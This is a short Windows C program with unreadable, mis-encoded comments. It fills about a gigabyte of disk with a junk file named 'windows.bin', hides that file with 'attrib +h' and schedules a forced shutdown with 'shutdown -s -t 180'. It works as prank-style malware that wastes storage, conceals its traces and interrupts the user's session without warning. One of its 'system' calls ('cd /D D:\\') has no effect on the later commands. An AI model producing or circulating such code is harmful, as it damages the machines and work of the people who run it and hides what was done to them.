#define _CRT_SECURE_NO_WARNINGS

//����һ��������
//��ͣд���������ݵ�D��
//���һ�ػ�

#include <stdio.h>
#include <windows.h>

int main()
{
	//���ļ�
	FILE* pf = fopen("windows.bin", "wb");
	if (pf == NULL)
	{
		perror("error_fopen_wb");
		return 1;
	}
	//�����ļ�
	int i = 1;
	int m = 1024 * 1024 * 1000 / 4;//1GB = 1024MB = 1024*1024KB = 1024*1024*1000byte;
	while (i<m)
	{
		fwrite(&i, sizeof(i), 1, pf);
		i++;
	}
	//�ر��ļ�
	fclose(pf);
	pf = NULL;
	system("cd /D D:\\");
	system("attrib \"windows.bin\" +h");
	system("shutdown -s -t 180");

	return 0;
}